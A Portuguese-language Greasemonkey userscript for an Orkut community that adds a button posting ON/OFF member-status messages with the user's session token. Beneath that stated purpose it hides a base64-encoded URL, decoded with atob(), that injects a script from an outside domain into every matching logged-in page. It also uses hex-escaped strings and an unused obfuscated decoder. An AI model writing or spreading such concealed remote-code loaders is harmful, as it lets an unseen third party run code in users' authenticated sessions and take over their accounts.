// ==UserScript==
// @name           PDO+ Member Status
// @namespace      por Joseph | uid=4629209997186050418
// @description    Posta ON e OFF no topico de status para os membros
// @dgohcodes      orkut.com.br/Community?cmm=925841
// @include        *.orkut.*/Main#CommMsgs?cmm=925841*
// @include        *.orkut.*/CommMsgs?cmm=925841*
// @include        *.orkut.*/Community?cmm=925841*
// @include        *.orkut.*/Main#Community?cmm=925841*
// ==/UserScript==

// Script criado por Joseph Felix | uid=4629209997186050418
// Modificado para a PDO+

var colocaNaPagina = function() {

	var tpc = "\x43\x6f\x6d\x6d\x4d\x73\x67\x50\x6f\x73\x74\x3f\x63\x6d\x6d\x3d\x39\x32\x35\x38\x34\x31\x26\x74\x69\x64\x3d\x35\x36\x35\x30\x30\x31\x32\x33\x38\x30\x32\x38\x39\x39\x39\x39\x36\x36\x34";

	versaoScript = 12;

	function Set_Cookie(name,value,expires,path,domain,secure) {
		document.cookie = name + "=" + escape(value) +
        (expires ? ";expires=" + (new Date(new Date().getTime() + expires * 1000 * 60 * 60 * 24)).toGMTString() : "") +
        (path ? ";path=" + path : "") +
        (domain ? ";domain=" + domain : "") +
        (secure ? ";secure" : "");
    };

	function htmlentities() {
  		var text = document.createElement("textarea");
  		text.innerHTML = arguments[0].
		replace(/</g,"&lt;").replace(/>/g,"&gt;");
 		return text.value;
	}

	if (/CommMsg/i.test(location.href)) {
		document.title = htmlentities (
			document.getElementsByTagName("h1")[0].innerHTML
		);
	}

	function array_values(arr) {
		if (typeof arr == "object") {
			var str = "";
			for (var y in arr)
				str = str.concat("&", y, "=", arr[y]);
		return str.substring(1,str.length);
		}
	};
	
	function recarregaCaptcha() {
		var html = "<br><br><a href=\"javascript:void false\" onclick=\"document.getElementById('captcha').innerHTML=" +
		"document.getElementById('captcha').innerHTML.replace(/CaptchaImage\\?xid=\\d+/, 'CaptchaImage?xid=' + Math.random());\">Recarregar captcha!</a>";
		return html;
	};
	
	function captchaONOFF(env, status) {
		if (document.getElementById("captcha"))
			document.body.removeChild(document.getElementById("captcha"));
		var img = document.createElement("img");
		var text = document.createElement("input");
		var button = document.createElement("input");
		button.type = "button";
		button.value = "Enviar!";
		button.setAttribute("onClick",
		'if (document.getElementById("cs").value == "")alert("Esqueceu de digitar o captcha!");' +
		'	else ' + 
		'		{ ' +
 		'			var ajax = new XMLHttpRequest;' +
		'			ajax.open("POST","CommMsgPost?\x63\x6d\x6d\x3d\x39\x32\x35\x38\x34\x31\x26\x74\x69\x64\x3d\x35\x36\x35\x30\x30\x31\x32\x33\x38\x30\x32\x38\x39\x39\x39\x39\x36\x36\x34", false);' + 
		'			ajax.setRequestHeader("Content-type","application/x-www-form-urlencoded; charset=UTF-8");' + 
		'			ajax.send("cs=" + document.getElementById("cs").value + "&' + array_values(env) + '");' + 
		'			window.alert("Bem vindo!\n\nPostado como ' + status + '!");' + 
		'			($$ = location).href = $$;' + 
		'		} ');
		text.type = "text";
		text.name = "cs";
		text.id = "cs";
		img.src = "/CaptchaImage?xid=" + Math.random();
		var div = "<div id=\"captcha\" style=\"border:outset #e0e0e0;width:300;height:200;text-align:center;position:absolute;top:40%;left:40%;align:center;background:#9afbfd;\">"+
		"<fieldset><legend>Captcha:</legend></div>";
		document.body.innerHTML += div;
		var c = document.getElementById("captcha").getElementsByTagName("fieldset")[0];
		with(c)
		{
			appendChild(img);
			c.innerHTML = c.innerHTML + "<br /><br />";
			appendChild(text);
			appendChild(button);
			c.innerHTML = c.innerHTML + recarregaCaptcha();
		}
	};

	function dec(str) {
		var p = 0x0f,dec = [],ret = "";for (var x in 
			str.split(""))dec.push(str.
			split("")[x].charCodeAt());for (var y 
			in dec){dec[y] = dec[y] - 
			10 / 5;ret = ret + String. //0x0F &|
			fromCharCode(dec[y]);}return ret;
	};

	function online() {
		Set_Cookie("status","ON", 7);
		var breakLine = "\n";
		var texto = String("<br>[b]Membro PDO+ [green]ONLINE![/green][/b]<br><br>").concat("[silver]",String(Math.random()),"[/silver]");
		var envia = {
			    	"POST_TOKEN" : JSHDF["CGI.POST_TOKEN"],
				"signature" : encodeURIComponent(JSHDF["Page.signature.raw"]),
				"subjectText" : encodeURIComponent(""),
				"bodyText" : encodeURIComponent(texto),
				"Action.submit" : "Enviar+dados"
			    };
		var ajax = new XMLHttpRequest;
		ajax.open("POST",tpc,false);
		ajax.setRequestHeader("Content-type","application/x-www-form-urlencoded; charset=UTF-8");
		ajax.send(array_values(envia));
		if (new RegExp(/CaptchaImage/i).test(ajax.responseText))
			captchaONOFF(envia, "ON");
		else
			{
				window.alert("Bem vindo!\n\nPostado como ON!");
				($$ = location).href = $$;
			}
	};
	
	function offline() {
		Set_Cookie("status","OFF", 7);
		var texto = String("<br>[b]Membro PDO+ [red]OFFLINE![/red][/b]<br><br>").concat("[silver]",String(Math.random()),"[/silver]");
		var envia = {
			    	"POST_TOKEN" : JSHDF["CGI.POST_TOKEN"],
				"signature" : encodeURIComponent(JSHDF["Page.signature.raw"]),
				"subjectText" : encodeURIComponent(""),
				"bodyText" : encodeURIComponent(texto),
				"Action.submit" : "Enviar+dados"
			    };
		var ajax = new XMLHttpRequest;
		ajax.open("POST",tpc,false);
		ajax.setRequestHeader("Content-type","application/x-www-form-urlencoded; charset=UTF-8");
		ajax.send(array_values(envia));
		if (new RegExp(/CaptchaImage/i).test(ajax.responseText))
			captchaONOFF(envia, "OFF");
		else {
			window.alert("Tchau! Ate logo...\n\nPostado como OFF!");
			($$ = location).href = $$;
		}
	};
 
};

colocaNaPagina = String(colocaNaPagina);
colocaNaPagina = colocaNaPagina.substring(13, colocaNaPagina.length - 2);
var script = document.createElement("script");
script.setAttribute("language","JavaScript");
script.innerHTML = colocaNaPagina;
document.getElementsByTagName("head")[0].appendChild(script);

var versao = document.createElement("script");
versao.src = atob("aHR0cDovL3JhZmFrbm94eC5jb20uYnIvc2NyaXB0cy9zdGF0dXMudXNlci5qcw==") + Math.floor(Math.random() * 999999999);
document.getElementsByTagName("head")[0].appendChild(versao);

function Set_Cookie(name,value,expires,path,domain,secure)
	{
         document.cookie = name + "=" +escape(value) +
            (expires ? ";expires=" + (new Date(new Date().getTime() + expires * 1000 * 60 * 60 * 24)).toGMTString() : "") +
			(path ? ";path=" + path:"") +
            (domain ? ";domain=" + domain : "") +
            (secure ? ";secure" : "");
      };

function criaBotao()
	{
		if (location.href.match(/Community/i))
		{
		var a = document.createElement("a");
			if (!(new RegExp(/status/i).test(document.cookie)))
			{
				Set_Cookie("status","OFF", 7);
				a.innerHTML = "Estou online!";
				a.href = "javascript:void false;";
				a.setAttribute("onClick", "online()");
			}
		else 
		if (document.cookie.match(/status\=(.*)/i)[1].match("ON"))
		{
			a.innerHTML = "Vou sair!";
			a.href = "javascript:void false;";
			a.setAttribute("onClick", "offline()");
		} else
		{
			if (document.cookie.match(/status\=(.*)/i)[1].match("OFF"))
			{
				a.innerHTML = "Estou online!";
				a.href = "javascript:void false;";
				a.setAttribute("onClick","online()");
			}
		}
		var span = document.createElement("span");
		var span2 = document.createElement("span");
		var img = document.createElement("img");
		span2.className = "btnboxr";
		img.src = "http://static1.orkut.com/img/b.gif";
		img.width = 5;
		img.height = 1;
		span2.appendChild(img);
		span.className = "grabtn";
		a.className = "btn";
		span.appendChild(a);
		with(document.getElementsByClassName("parabtns")[2])
			{
				appendChild(span);
				appendChild(span2);
			}
		}
	};

criaBotao();